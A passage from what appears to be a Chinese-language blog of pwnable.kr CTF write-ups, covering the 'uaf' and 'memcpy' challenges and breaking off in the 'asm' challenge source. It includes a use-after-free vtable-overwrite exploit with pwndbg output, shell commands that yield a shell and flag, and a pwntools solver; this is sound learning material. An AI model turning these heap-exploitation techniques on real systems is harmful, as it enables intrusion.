function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    Human<span class="token operator">*</span> m <span class="token operator">=</span> new <span class="token function">Man</span><span class="token punctuation">(</span><span class="token string">"Jack"</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Human<span class="token operator">*</span> w <span class="token operator">=</span> new <span class="token function">Woman</span><span class="token punctuation">(</span><span class="token string">"Jill"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t len<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> op<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"1. use\n2. after\n3. free\n"</span><span class="token punctuation">;</span>        cin <span class="token operator">>></span> op<span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                m<span class="token operator">-></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                w<span class="token operator">-></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                len <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                data <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">read</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"your data is allocated"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                delete m<span class="token punctuation">;</span>                delete w<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-15"><a href="#ÂàÜÊûê-15" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Áªà‰∫éÂà∞ use-after-free ÁöÑÈ¢ò‰∫Ü</p><p>Â≠¶‰π†ÂèØ‰ª•Áúã‰∏ãËøô‰∏™ËßÜÈ¢ëÔºö<a href="https://www.youtube.com/watch?v=ZHghwsTRyzQ" target="_blank" rel="noopener">The Heap: How do use-after-free exploits work? - bin 0x16</a></p><p>È¢òÁõÆÊèê‰æõ‰∫Ü‰∏âÁßçÊìç‰ΩúÔºåÂàÜÂà´ÂØπÁî® ÈáäÊîæ-ÂàÜÈÖç-Ë∞ÉÁî®</p><ol><li>Êàë‰ª¨ÂÖàÊù•Áúã‰∏ãÂú®Â†Ü‰∏≠ÁöÑÁªìÊûÑÔºåÈ¶ñÂÖàË¶ÅÁ°ÆÂÆöÂ§ßÂ∞è‰∏∫ 24 Â≠óËäÇ</li></ol><pre class=" language-armasm"><code class="language-armasm">0x0000000000400efb <+55>:   mov    edi,0x180x0000000000400f00 <+60>:   call   0x400d90 <operator new(unsigned long)@plt></code></pre><p>Âú® heap ‰∏≠Êàë‰ª¨‰πüËÉΩÁúãÂà∞ÂàÜÈÖç‰∫ÜÈïøÂ∫¶‰∏∫0x20ÁöÑÁ©∫Èó¥Ôºå‰∏∫‰ªÄ‰πà‰∏çÊòØ0x18Âë¢ÔºåÊòØÊ∫êËá™ malloc_chunk Êó∂‰ºöËøõË°åÂØπÈΩêÔºåÂÖ∑‰ΩìÂèØËßÅËøôÁØáÊñáÁ´†<a href="https://wiki.x10sec.org/pwn/heap/heap_structure/" target="_blank" rel="noopener">Â†ÜÁõ∏ÂÖ≥Êï∞ÊçÆÁªìÊûÑ</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15916053178506.jpg" alt></p><p>ÈÄöËøá chunk Â§çÁî®Â≠òÂÖ•ÁöÑÁªìÊûÑ‰ΩìÂ¶Ç‰∏ãÔºåÂèØ‰ª•ÁúãÂà∞Êï∞ÊçÆÂàÜÂà´ÂØπÂ∫î</p><ul><li>8 (vptr)</li><li>8 (int_age)</li><li>8 (prt_name)</li></ul><p><strong>ËøôÈáåÊúâ‰∏™Â•áÊÄ™ÁöÑÁÇπÔºåÂèØ‰ª•ÁúãÂà∞ ptr_name ÂùáÊòØÊåáÂêë‰∏ä‰∏Ä‰∏™chunkË¢´Â§çÁî®ÈÉ®ÂàÜ‰∏≠ÁöÑÈô§ priv_size Âíå size ÁöÑÂâ©‰ΩôÈÉ®ÂàÜÔºåÂèØËÉΩÊòØÁºñËØë‰ºòÂåñÂØºËá¥ÁöÑÔºü</strong></p><p>Ê≥®ÊÑèÂà∞ÊòØÂÖàÈÄöËøá Man ÁöÑËôöË°®ÂéªË∞ÉÁî® introduce ÊñπÊ≥ï</p><pre class=" language-armasm"><code class="language-armasm">pwndbg> x/4 0x4015700x401570 <vtable for Man+16>:    0x000000000040117a    0x00000000004012d20x401580 <vtable for Human>:    0x0000000000000000    0x00000000004015f0pwndbg> x 0x40117a0x40117a <Human::give_shell()>:    0x10ec8348e5894855pwndbg> x 0x4012d20x4012d2 <Man::introduce()>:    0x10ec8348e5894855</code></pre><p>ÊâÄ‰ª•Êàë‰ª¨Âè™Ë¶ÅËÉΩË¶ÜÁõñ vptr ‰ΩøÂÖ∂ÊåáÂêë ÂéüÂú∞ÂùÄ-8ÔºåÂç≥0x401570 - 0x8 = 0x00401568ÔºåËøôÊ†∑ÁªèËøáÊâßË°åÊó∂ÁöÑ+0x8Â∞±‰ºöË∞ÉÁî® give_shell ÂáΩÊï∞</p><p>ËøôÈáåËøòË¶ÅÊ≥®ÊÑèÔºåfree Êó∂ÂÖàÈáäÊîæÁöÑ m ÂêéÈáäÊîæÁöÑ wÔºåÊâÄ‰ª•Â°´ÂÖÖÊó∂ÊòØÂÖàÂ°´ÂÖÖÁöÑ w ÂêéÂ°´ÂÖÖ mÔºåÊâÄ‰ª•ÈúÄË¶ÅÊ≠•È™§ 2 ÊâßË°å‰∏§Ê¨°</p><p>Âè¶Â§ñÔºåÁî±‰∫éÊàë‰ª¨Âè™ÈúÄË¶ÅÂ°´ÂÖÖ vptr ÈÉ®ÂàÜÔºåÊâÄÈúÄ 8 Â≠óËäÇÊòØÂ∞è‰∫éÈáäÊîæÁöÑ chunk ÁöÑÔºåÊâÄ‰ª•‰ºöÁõ¥Êé•Â°´ÂÖÖ‰∏§Ê¨°Ê∂àËÄóÈáäÊîæÁöÑÁ©∫Èó¥Âç≥ÂèØ</p><h3 id="Ëß£È¢ò-15"><a href="#Ëß£È¢ò-15" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">uaf@pwnable:~$ python -c  'print "\x68\x15\x40\x00\x00\x00\x00\x00"' > /tmp/uafpassuaf@pwnable:~$ ./uaf 8 /tmp/uafpass1. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2your data is allocated1. use2. after3. free1$ cat flagyay_f1ag_aft3r_pwning</code></pre><p>ÂèÇËÄÉÔºö</p><ol><li><a href="https://tzhuobo.gitee.io/2019/11/21/pwnable-kr-uaf/" target="_blank" rel="noopener">https://tzhuobo.gitee.io/2019/11/21/pwnable-kr-uaf/</a></li><li><a href="http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/" target="_blank" rel="noopener">http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/</a></li></ol><h2 id="17-memcpy"><a href="#17-memcpy" class="headerlink" title="17. memcpy"></a>17. memcpy</h2><h3 id="È¢òÁõÆ-16"><a href="#È¢òÁõÆ-16" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"rdtsc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dest<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">fast_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>    size_t i<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 64-byte block fast copy</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">>=</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        i <span class="token operator">=</span> len <span class="token operator">/</span> <span class="token number">64</span><span class="token punctuation">;</span>        len <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            __asm__ <span class="token function">__volatile__</span> <span class="token punctuation">(</span>            <span class="token string">"movdqa (%0), %%xmm0\n"</span>            <span class="token string">"movdqa 16(%0), %%xmm1\n"</span>            <span class="token string">"movdqa 32(%0), %%xmm2\n"</span>            <span class="token string">"movdqa 48(%0), %%xmm3\n"</span>            <span class="token string">"movntps %%xmm0, (%1)\n"</span>            <span class="token string">"movntps %%xmm1, 16(%1)\n"</span>            <span class="token string">"movntps %%xmm2, 32(%1)\n"</span>            <span class="token string">"movntps %%xmm3, 48(%1)\n"</span>            <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dest <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>            src <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// byte-to-byte slow copy</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dest<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hey, I have a boring assignment for CS class.. :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The assignment is simple.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- What is the best implementation of memcpy?        -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 1. implement your own slow/fast version of memcpy -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 2. compare them with various size of data         -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 3. conclude your experiment and submit report     -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This time, just help me out with my experiment and get flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No fancy hacking, I promise :D\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> t1<span class="token punctuation">,</span> t2<span class="token punctuation">;</span>    <span class="token keyword">int</span> e<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> high<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// allocate memory</span>    <span class="token keyword">char</span><span class="token operator">*</span> cache1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> cache2 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    src <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t sizes<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// setup experiment parameters</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>e<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span> e<span class="token operator">&lt;</span><span class="token number">14</span><span class="token punctuation">;</span> e<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 2^13 = 8K</span>        low <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        high <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"specify the memcpy amount between %d ~ %d : "</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> size <span class="token operator">&lt;</span> low <span class="token operator">||</span> size <span class="token operator">></span> high <span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"don't mess with the experiment.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        sizes<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ok, lets run the experiment with your configuration\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// run experiment</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        size <span class="token operator">=</span> sizes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"experiment %d : memcpy with buffer size %d\n"</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        dest <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span> size <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// to eliminate cache effect</span>        t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// byte-to-byte memcpy</span>        t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// to eliminate cache effect</span>        t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fast_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// block-to-block memcpy</span>        t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"thanks for helping my experiment!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag : ----- erased in this source code -----\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-16"><a href="#ÂàÜÊûê-16" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><blockquote><p>ÊääÊ∫êÂ≠òÂÇ®Âô®ÂÜÖÂÆπÂÄºÈÄÅÂÖ•ÁõÆÁöÑÂØÑÂ≠òÂô®,ÂΩìÊúâm128Êó∂,ÂøÖÈ°ªÂØπÈΩêÂÜÖÂ≠ò16Â≠óËäÇ,‰πüÂ∞±ÊòØÂÜÖÂ≠òÂú∞ÂùÄ‰Ωé4‰Ωç‰∏∫0.</p><p>movntps m128,XMM<br>m128 &lt;== XMM Áõ¥Êé•ÊääXMM‰∏≠ÁöÑÂÄºÈÄÅÂÖ•m128Ôºå‰∏çÁªèËøácache,ÂøÖÈ°ªÂØπÈΩê16Â≠óËäÇ.</p></blockquote><p>Ê≥®ÊÑèÂà∞ÂΩì input &gt; 64 Êó∂Ôºå‰ºöË∞ÉÁî® fast_memcpy ‰∏ãÁöÑ movntps Êåá‰ª§ÔºåÊ≠§Êó∂ÂøÖÈ°ª‰øùËØÅÂú∞ÂùÄÂØπÈΩê</p><p>Âè¶Â§ñ malloc ÈÄöËøá edx ÂÄºËøîÂõûÂú∞ÂùÄÂÄº</p><p>ËÄÉËôëÂà∞ÂàÜÈÖç chunk Êó∂ÊúâÂõ∫ÂÆö headerÔºå32 ‰Ωç‰∏ãÈïøÂ∫¶‰∏∫ 0x8 (priv_size + size)ÔºåÊâÄ‰ª•ÊØèÊ¨°inputÊó∂ÔºåÊàë‰ª¨ÈÄöËøáÊéßÂà∂ padding ‰øùËØÅÊª°Ë∂≥‰∏ãÂàóÊù°‰ª∂‰πã‰∏ÄÔºö</p><ul><li>(input + padding + len(header)) % 0x10 &gt; 0x8 ËøôÁßçÊÉÖÂÜµ‰ºöËá™Âä®ÂØπÈΩêËá≥ 0x10</li><li>(input + padding + len(header)) % 0x10 = 0x0</li></ul><p>Êé®ËçêÔºö<a href="https://www.cnblogs.com/wangaohui/p/5190889.html" target="_blank" rel="noopener">MallocÁ¢éÁ¢éÂøµ</a></p><p><strong>ËøôÈáåÊ∑ªÂä†‰∏Ä‰∏ãÂØπÈΩêÂâçÂêéÁöÑÂ†ÜÂÜÖÂÆπÁöÑÂØπÊØîÂõæÁâá</strong></p><h3 id="Ëß£È¢ò-16"><a href="#Ëß£È¢ò-16" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>chunk_header <span class="token operator">=</span> <span class="token number">0x8</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9022</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> <span class="token number">8</span> <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">2</span><span class="token operator">**</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> chunk_header    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[->] %d"</span> <span class="token operator">%</span> n<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"experiment!\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="18-asm"><a href="#18-asm" class="headerlink" title="18. asm"></a>18. asm</h2><h3 id="È¢òÁõÆ-17"><a href="#È¢òÁõÆ-17" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;seccomp.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/prctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 128</span><span class="token keyword">void</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    scmp_filter_ctx ctx <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span>SCMP_ACT_KILL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"seccomp error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token 